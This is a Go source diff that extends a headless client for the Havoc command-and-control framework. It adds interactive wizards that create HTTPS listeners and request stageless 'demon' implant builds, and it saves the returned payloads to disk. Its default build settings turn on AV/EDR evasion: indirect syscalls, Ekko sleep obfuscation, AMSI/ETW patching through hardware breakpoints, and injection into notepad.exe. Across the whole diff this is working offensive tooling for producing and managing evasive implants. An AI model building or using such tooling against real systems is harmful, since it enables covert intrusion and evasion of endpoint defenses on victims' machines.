@@ -9,10 +9,12 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"math/rand"
 	"net/url"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"sort"
 	"strconv"
 	"strings"
@@ -161,6 +163,44 @@ type chatMessage struct {
 	Message string
 }
 
+type listenerConfig struct {
+	Name          string
+	Protocol      string
+	HostBind      string
+	PortBind      string
+	PortConn      string
+	Hosts         string
+	HostRotation  string
+	Headers       string
+	Uris          string
+	UserAgent     string
+	HostHeader    string
+	ProxyEnabled  bool
+	ProxyType     string
+	ProxyHost     string
+	ProxyPort     string
+	ProxyUsername string
+	ProxyPassword string
+}
+
+type demonBuildConfig struct {
+	Listener         string
+	Arch             string
+	Format           string
+	Sleep            int
+	Jitter           int
+	IndirectSyscall  bool
+	StackDuplication bool
+	SleepTechnique   string
+	SleepJmpGadget   string
+	ProxyLoading     string
+	AmsiEtwPatch     string
+	InjectionAlloc   string
+	InjectionExecute string
+	InjectionSpawn64 string
+	InjectionSpawn32 string
+}
+
 func newHeadlessClient(host string, port int, user, password string, insecure bool) (*headlessClient, error) {
 	dialer := websocket.Dialer{TLSClientConfig: &tls.Config{InsecureSkipVerify: insecure}}
 	u := url.URL{Scheme: "wss", Host: fmt.Sprintf("%s:%d", host, port), Path: "/havoc/"}
@@ -255,6 +295,8 @@ func (c *headlessClient) handlePackage(pk packager.Package) {
 		c.handleSession(pk)
 	case packager.Type.Teamserver.Type:
 		c.handleTeamserver(pk)
+	case packager.Type.Gate.Type:
+		c.handleGate(pk)
 	case packager.Type.Chat.Type:
 		c.handleChat(pk)
 	default:
@@ -384,6 +426,55 @@ func (c *headlessClient) handleTeamserver(pk packager.Package) {
 	}
 }
 
+func (c *headlessClient) handleGate(pk packager.Package) {
+	info := pk.Body.Info
+
+	if message := stringValue(info, "Message"); message != "" {
+		msgType := stringValue(info, "MessageType")
+		if msgType == "" {
+			msgType = "message"
+		} else {
+			msgType = strings.ToLower(msgType)
+		}
+		c.printf("builder %s: %s", msgType, message)
+		return
+	}
+
+	payloadB64 := stringValue(info, "PayloadArray")
+	if payloadB64 == "" {
+		c.printf("received gate event %d/%d", pk.Head.Event, pk.Body.SubEvent)
+		return
+	}
+
+	data, err := base64.StdEncoding.DecodeString(payloadB64)
+	if err != nil {
+		c.printf("builder payload decode error: %v", err)
+		return
+	}
+
+	fileName := filepath.Base(stringValue(info, "FileName"))
+	if fileName == "" {
+		fileName = fmt.Sprintf("payload-%s.bin", time.Now().Format("20060102-150405"))
+	}
+
+	path := fileName
+	if statErr := ensureWritablePath(&path); statErr != nil {
+		c.printf("builder produced payload (%d bytes) but could not prepare %s: %v", len(data), fileName, statErr)
+		return
+	}
+
+	if err := os.WriteFile(path, data, 0o600); err != nil {
+		c.printf("builder produced payload (%d bytes) but failed to save %s: %v", len(data), path, err)
+		return
+	}
+
+	format := stringValue(info, "Format")
+	if format == "" {
+		format = "payload"
+	}
+	c.printf("builder saved %s to %s (%d bytes)", format, path, len(data))
+}
+
 func (c *headlessClient) handleChat(pk packager.Package) {
 	switch pk.Body.SubEvent {
 	case packager.Type.Chat.NewMessage:
@@ -409,14 +500,18 @@ func (c *headlessClient) handleChat(pk packager.Package) {
 
 func (c *headlessClient) interactive(ctx context.Context, cancel context.CancelFunc) error {
 	fmt.Println("Headless Havoc client ready. Type 'help' for a list of commands.")
-	scanner := bufio.NewScanner(os.Stdin)
+	reader := bufio.NewReader(os.Stdin)
 	for {
 		fmt.Print("> ")
-		if !scanner.Scan() {
-			return scanner.Err()
+		line, err := readLine(reader)
+		if err != nil {
+			if errors.Is(err, io.EOF) {
+				return nil
+			}
+			return err
 		}
-		line := strings.TrimSpace(scanner.Text())
-		if line == "" {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" {
 			continue
 		}
 
@@ -426,7 +521,7 @@ func (c *headlessClient) interactive(ctx context.Context, cancel context.CancelF
 		default:
 		}
 
-		fields := strings.Fields(line)
+		fields := strings.Fields(trimmed)
 		cmd := strings.ToLower(fields[0])
 		args := fields[1:]
 
@@ -435,8 +530,20 @@ func (c *headlessClient) interactive(ctx context.Context, cancel context.CancelF
 			c.printHelp()
 		case "listeners":
 			c.printListeners()
+		case "listener-create":
+			if err := c.handleListenerCreate(ctx, reader); err != nil {
+				if !errors.Is(err, context.Canceled) {
+					fmt.Printf("failed to create listener: %v\n", err)
+				}
+			}
 		case "agents":
 			c.printAgents()
+		case "demon-create":
+			if err := c.handleDemonCreate(ctx, reader); err != nil {
+				if !errors.Is(err, context.Canceled) {
+					fmt.Printf("failed to create demon: %v\n", err)
+				}
+			}
 		case "chatlog":
 			c.printChat()
 		case "chat":
@@ -444,12 +551,12 @@ func (c *headlessClient) interactive(ctx context.Context, cancel context.CancelF
 				fmt.Println("usage: chat <message>")
 				continue
 			}
-			message := strings.TrimSpace(line[len(fields[0]):])
+			message := strings.TrimSpace(trimmed[len(fields[0]):])
 			if err := c.sendChat(message); err != nil {
 				fmt.Printf("failed to send chat message: %v\n", err)
 			}
 		case "task":
-			if err := c.handleTaskCommand(line, args); err != nil {
+			if err := c.handleTaskCommand(trimmed, args); err != nil {
 				fmt.Printf("failed to send task: %v\n", err)
 			}
 		case "mark":
@@ -473,7 +580,9 @@ func (c *headlessClient) printHelp() {
 	fmt.Println(`Available commands:
   help                Show this help message
   listeners           Display listeners known to the teamserver
+  listener-create     Launch an interactive wizard to create a listener
   agents              Display active agents
+  demon-create        Launch an interactive wizard to request a stageless demon
   chatlog             Show the recent chat messages
   chat <message>      Send a chat message to all operators
   task <agent> <command-id> [one-time] [CommandLine text] [key=value ...]
@@ -531,6 +640,250 @@ func (c *headlessClient) printChat() {
 	}
 }
 
+func defaultListenerConfig() listenerConfig {
+	return listenerConfig{
+		Name:         "AS13_Listener",
+		Protocol:     "Https",
+		HostBind:     "192.168.2.50",
+		PortBind:     "443",
+		PortConn:     "443",
+		Hosts:        "192.168.198.128",
+		HostRotation: "Round-Robin",
+		UserAgent:    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+	}
+}
+
+func defaultDemonBuildConfig() demonBuildConfig {
+	return demonBuildConfig{
+		Listener:         "AS13_Listener",
+		Arch:             "x64",
+		Format:           "Windows Shellcode",
+		Sleep:            5,
+		Jitter:           35,
+		IndirectSyscall:  true,
+		StackDuplication: true,
+		SleepTechnique:   "Ekko",
+		SleepJmpGadget:   "None",
+		ProxyLoading:     "RtlCreateTimer",
+		AmsiEtwPatch:     "Hardware breakpoints",
+		InjectionAlloc:   "Native/Syscall",
+		InjectionExecute: "Native/Syscall",
+		InjectionSpawn64: "C:\\Windows\\System32\\notepad.exe",
+		InjectionSpawn32: "C:\\Windows\\SysWOW64\\notepad.exe",
+	}
+}
+
+func (c *headlessClient) handleListenerCreate(ctx context.Context, reader *bufio.Reader) error {
+	cfg := defaultListenerConfig()
+	fmt.Println("Configure listener settings (press Enter to accept the default in brackets).")
+
+	var err error
+	if cfg.Name, err = promptString(ctx, reader, "Name", cfg.Name); err != nil {
+		return err
+	}
+	protocolChoices := []string{"Https", "Http"}
+	if cfg.Protocol, err = promptChoice(ctx, reader, "Protocol", cfg.Protocol, protocolChoices); err != nil {
+		return err
+	}
+	if cfg.HostBind, err = promptString(ctx, reader, "Bind Host", cfg.HostBind); err != nil {
+		return err
+	}
+	if cfg.PortBind, err = promptString(ctx, reader, "Bind Port", cfg.PortBind); err != nil {
+		return err
+	}
+	if cfg.PortConn, err = promptString(ctx, reader, "Connect Port", cfg.PortConn); err != nil {
+		return err
+	}
+	if cfg.Hosts, err = promptString(ctx, reader, "Hosts (comma separated)", cfg.Hosts); err != nil {
+		return err
+	}
+	if cfg.HostRotation, err = promptString(ctx, reader, "Host Rotation", cfg.HostRotation); err != nil {
+		return err
+	}
+	if cfg.Uris, err = promptString(ctx, reader, "URIs (comma separated)", cfg.Uris); err != nil {
+		return err
+	}
+	if cfg.Headers, err = promptString(ctx, reader, "Headers (comma separated)", cfg.Headers); err != nil {
+		return err
+	}
+	if cfg.UserAgent, err = promptString(ctx, reader, "User-Agent", cfg.UserAgent); err != nil {
+		return err
+	}
+	if cfg.HostHeader, err = promptString(ctx, reader, "Host Header", cfg.HostHeader); err != nil {
+		return err
+	}
+	if cfg.ProxyEnabled, err = promptBool(ctx, reader, "Proxy Enabled", cfg.ProxyEnabled); err != nil {
+		return err
+	}
+	if cfg.ProxyEnabled {
+		if cfg.ProxyType, err = promptString(ctx, reader, "Proxy Type", cfg.ProxyType); err != nil {
+			return err
+		}
+		if cfg.ProxyHost, err = promptString(ctx, reader, "Proxy Host", cfg.ProxyHost); err != nil {
+			return err
+		}
+		if cfg.ProxyPort, err = promptString(ctx, reader, "Proxy Port", cfg.ProxyPort); err != nil {
+			return err
+		}
+		if cfg.ProxyUsername, err = promptString(ctx, reader, "Proxy Username", cfg.ProxyUsername); err != nil {
+			return err
+		}
+		if cfg.ProxyPassword, err = promptString(ctx, reader, "Proxy Password", cfg.ProxyPassword); err != nil {
+			return err
+		}
+	}
+
+	info := map[string]any{
+		"Name":          cfg.Name,
+		"Protocol":      cfg.Protocol,
+		"Status":        "online",
+		"Secure":        "false",
+		"Hosts":         cfg.Hosts,
+		"HostBind":      cfg.HostBind,
+		"HostRotation":  cfg.HostRotation,
+		"PortBind":      cfg.PortBind,
+		"PortConn":      cfg.PortConn,
+		"Headers":       cfg.Headers,
+		"Uris":          cfg.Uris,
+		"UserAgent":     cfg.UserAgent,
+		"HostHeader":    cfg.HostHeader,
+		"Proxy Enabled": strconv.FormatBool(cfg.ProxyEnabled),
+	}
+
+	if strings.EqualFold(cfg.Protocol, "https") {
+		info["Secure"] = "true"
+	}
+
+	if cfg.ProxyEnabled {
+		info["Proxy Type"] = cfg.ProxyType
+		info["Proxy Host"] = cfg.ProxyHost
+		info["Proxy Port"] = cfg.ProxyPort
+		info["Proxy Username"] = cfg.ProxyUsername
+		info["Proxy Password"] = cfg.ProxyPassword
+	}
+
+	if err := c.submitListenerAdd(info); err != nil {
+		return err
+	}
+	c.printf("submitted listener creation request for %s", cfg.Name)
+	return nil
+}
+
+func (c *headlessClient) handleDemonCreate(ctx context.Context, reader *bufio.Reader) error {
+	cfg := defaultDemonBuildConfig()
+	fmt.Println("Configure demon build (press Enter to accept the default in brackets).")
+
+	var err error
+	listeners := c.state.snapshotListeners()
+	if len(listeners) > 0 {
+		fmt.Print("Known listeners: ")
+		names := make([]string, 0, len(listeners))
+		for _, l := range listeners {
+			names = append(names, l.Name)
+		}
+		fmt.Println(strings.Join(names, ", "))
+	}
+
+	if cfg.Listener, err = promptString(ctx, reader, "Listener", cfg.Listener); err != nil {
+		return err
+	}
+	if cfg.Arch, err = promptChoice(ctx, reader, "Architecture", cfg.Arch, []string{"x64", "x86"}); err != nil {
+		return err
+	}
+	formatChoices := []string{"Windows Exe", "Windows Service Exe", "Windows DLL", "Windows Shellcode"}
+	if cfg.Format, err = promptChoice(ctx, reader, "Format", cfg.Format, formatChoices); err != nil {
+		return err
+	}
+	if cfg.Sleep, err = promptInt(ctx, reader, "Sleep (seconds)", cfg.Sleep); err != nil {
+		return err
+	}
+	if cfg.Jitter, err = promptInt(ctx, reader, "Jitter (0-100)", cfg.Jitter); err != nil {
+		return err
+	}
+	if cfg.IndirectSyscall, err = promptBool(ctx, reader, "Indirect Syscall", cfg.IndirectSyscall); err != nil {
+		return err
+	}
+	if cfg.StackDuplication, err = promptBool(ctx, reader, "Stack Duplication", cfg.StackDuplication); err != nil {
+		return err
+	}
+	sleepChoices := []string{"WaitForSingleObjectEx", "Foliage", "Ekko", "Zilean"}
+	if cfg.SleepTechnique, err = promptChoice(ctx, reader, "Sleep Technique", cfg.SleepTechnique, sleepChoices); err != nil {
+		return err
+	}
+	gadgetChoices := []string{"None", "jmp rax", "jmp rbx"}
+	if cfg.SleepJmpGadget, err = promptChoice(ctx, reader, "Sleep Jmp Gadget", cfg.SleepJmpGadget, gadgetChoices); err != nil {
+		return err
+	}
+	proxyChoices := []string{"None (LdrLoadDll)", "RtlRegisterWait", "RtlCreateTimer", "RtlQueueWorkItem"}
+	if cfg.ProxyLoading, err = promptChoice(ctx, reader, "Proxy Loading", cfg.ProxyLoading, proxyChoices); err != nil {
+		return err
+	}
+	amsiChoices := []string{"None", "Hardware breakpoints"}
+	if cfg.AmsiEtwPatch, err = promptChoice(ctx, reader, "Amsi/Etw Patch", cfg.AmsiEtwPatch, amsiChoices); err != nil {
+		return err
+	}
+	allocChoices := []string{"Win32", "Native/Syscall"}
+	if cfg.InjectionAlloc, err = promptChoice(ctx, reader, "Injection Alloc", cfg.InjectionAlloc, allocChoices); err != nil {
+		return err
+	}
+	if cfg.InjectionExecute, err = promptChoice(ctx, reader, "Injection Execute", cfg.InjectionExecute, allocChoices); err != nil {
+		return err
+	}
+	if cfg.InjectionSpawn64, err = promptString(ctx, reader, "Injection Spawn64", cfg.InjectionSpawn64); err != nil {
+		return err
+	}
+	if cfg.InjectionSpawn32, err = promptString(ctx, reader, "Injection Spawn32", cfg.InjectionSpawn32); err != nil {
+		return err
+	}
+
+	config := map[string]any{
+		"Sleep":             cfg.Sleep,
+		"Jitter":            cfg.Jitter,
+		"Indirect Syscall":  cfg.IndirectSyscall,
+		"Stack Duplication": cfg.StackDuplication,
+		"Sleep Technique":   cfg.SleepTechnique,
+		"Sleep Jmp Gadget":  cfg.SleepJmpGadget,
+		"Proxy Loading":     cfg.ProxyLoading,
+		"Amsi/Etw Patch":    cfg.AmsiEtwPatch,
+		"Injection": map[string]any{
+			"Alloc":   cfg.InjectionAlloc,
+			"Execute": cfg.InjectionExecute,
+			"Spawn64": cfg.InjectionSpawn64,
+			"Spawn32": cfg.InjectionSpawn32,
+		},
+	}
+
+	configJSON, err := json.Marshal(config)
+	if err != nil {
+		return err
+	}
+
+	pk := packager.Package{
+		Head: packager.Head{
+			Event:   packager.Type.Gate.Type,
+			User:    c.username,
+			Time:    time.Now().Format("02/01/2006 15:04:05"),
+			OneTime: "true",
+		},
+		Body: packager.Body{
+			SubEvent: packager.Type.Gate.Stageless,
+			Info: map[string]any{
+				"AgentType": "Demon",
+				"Listener":  cfg.Listener,
+				"Arch":      cfg.Arch,
+				"Format":    cfg.Format,
+				"Config":    string(configJSON),
+			},
+		},
+	}
+
+	if err := c.sendPackage(pk); err != nil {
+		return err
+	}
+	c.printf("requested stageless %s demon for listener %s", cfg.Arch, cfg.Listener)
+	return nil
+}
+
 func (c *headlessClient) sendChat(message string) error {
 	if strings.TrimSpace(message) == "" {
 		return errors.New("message cannot be empty")
@@ -546,6 +899,21 @@ func (c *headlessClient) sendChat(message string) error {
 		},
 		Body: packager.Body{
 			SubEvent: packager.Type.Chat.NewMessage,
+			Info:     info,
+		},
+	}
+	return c.sendPackage(pk)
+}
+
+func (c *headlessClient) submitListenerAdd(info map[string]any) error {
+	pk := packager.Package{
+		Head: packager.Head{
+			Event: packager.Type.Listener.Type,
+			User:  c.username,
+			Time:  time.Now().Format("02/01/2006 15:04:05"),
+		},
+		Body: packager.Body{
+			SubEvent: packager.Type.Listener.Add,
 			Info:     info,
 		},
 	}
@@ -724,6 +1092,150 @@ func mapToStringMap(in map[string]any) map[string]string {
 		}
 	}
 	return out
+}
+
+func ensureWritablePath(path *string) error {
+	candidate := *path
+	if candidate == "" {
+		return errors.New("output path cannot be empty")
+	}
+
+	info, err := os.Stat(candidate)
+	if err != nil {
+		if os.IsNotExist(err) {
+			parent := filepath.Dir(candidate)
+			if parent != "." {
+				if stat, statErr := os.Stat(parent); statErr != nil {
+					return statErr
+				} else if !stat.IsDir() {
+					return fmt.Errorf("%s is not a directory", parent)
+				}
+			}
+			return nil
+		}
+		return err
+	}
+
+	if info.IsDir() {
+		return fmt.Errorf("%s is a directory", candidate)
+	}
+
+	base := strings.TrimSuffix(candidate, filepath.Ext(candidate))
+	ext := filepath.Ext(candidate)
+	for i := 1; ; i++ {
+		next := fmt.Sprintf("%s-%d%s", base, i, ext)
+		if _, err := os.Stat(next); os.IsNotExist(err) {
+			*path = next
+			return nil
+		}
+	}
+}
+
+func readLine(reader *bufio.Reader) (string, error) {
+	line, err := reader.ReadString('\n')
+	if err != nil {
+		if errors.Is(err, io.EOF) {
+			if len(line) == 0 {
+				return "", io.EOF
+			}
+			return strings.TrimRight(line, "\r\n"), nil
+		}
+		return "", err
+	}
+	return strings.TrimRight(line, "\r\n"), nil
+}
+
+func promptString(ctx context.Context, reader *bufio.Reader, label, def string) (string, error) {
+	for {
+		if err := ctx.Err(); err != nil {
+			return "", err
+		}
+		fmt.Printf("%s [%s]: ", label, def)
+		value, err := readLine(reader)
+		if err != nil {
+			return "", err
+		}
+		trimmed := strings.TrimSpace(value)
+		if trimmed == "" {
+			return def, nil
+		}
+		return trimmed, nil
+	}
+}
+
+func promptChoice(ctx context.Context, reader *bufio.Reader, label, def string, choices []string) (string, error) {
+	for {
+		if err := ctx.Err(); err != nil {
+			return "", err
+		}
+		fmt.Printf("%s [%s]: ", label, def)
+		value, err := readLine(reader)
+		if err != nil {
+			return "", err
+		}
+		trimmed := strings.TrimSpace(value)
+		if trimmed == "" {
+			return def, nil
+		}
+		for _, choice := range choices {
+			if strings.EqualFold(trimmed, choice) {
+				return choice, nil
+			}
+		}
+		fmt.Printf("invalid value. valid options: %s\n", strings.Join(choices, ", "))
+	}
+}
+
+func promptBool(ctx context.Context, reader *bufio.Reader, label string, def bool) (bool, error) {
+	defDisplay := "n"
+	if def {
+		defDisplay = "y"
+	}
+	for {
+		if err := ctx.Err(); err != nil {
+			return false, err
+		}
+		fmt.Printf("%s [%s]: ", label, defDisplay)
+		value, err := readLine(reader)
+		if err != nil {
+			return false, err
+		}
+		trimmed := strings.TrimSpace(strings.ToLower(value))
+		if trimmed == "" {
+			return def, nil
+		}
+		switch trimmed {
+		case "y", "yes", "true", "1":
+			return true, nil
+		case "n", "no", "false", "0":
+			return false, nil
+		default:
+			fmt.Println("please answer with y/n")
+		}
+	}
+}
+
+func promptInt(ctx context.Context, reader *bufio.Reader, label string, def int) (int, error) {
+	for {
+		if err := ctx.Err(); err != nil {
+			return 0, err
+		}
+		fmt.Printf("%s [%d]: ", label, def)
+		value, err := readLine(reader)
+		if err != nil {
+			return 0, err
+		}
+		trimmed := strings.TrimSpace(value)
+		if trimmed == "" {
+			return def, nil
+		}
+		n, convErr := strconv.Atoi(trimmed)
+		if convErr != nil {
+			fmt.Println("please enter a valid number")
+			continue
+		}
+		return n, nil
+	}
 }
 
 func stringValue(m map[string]any, key string) string {
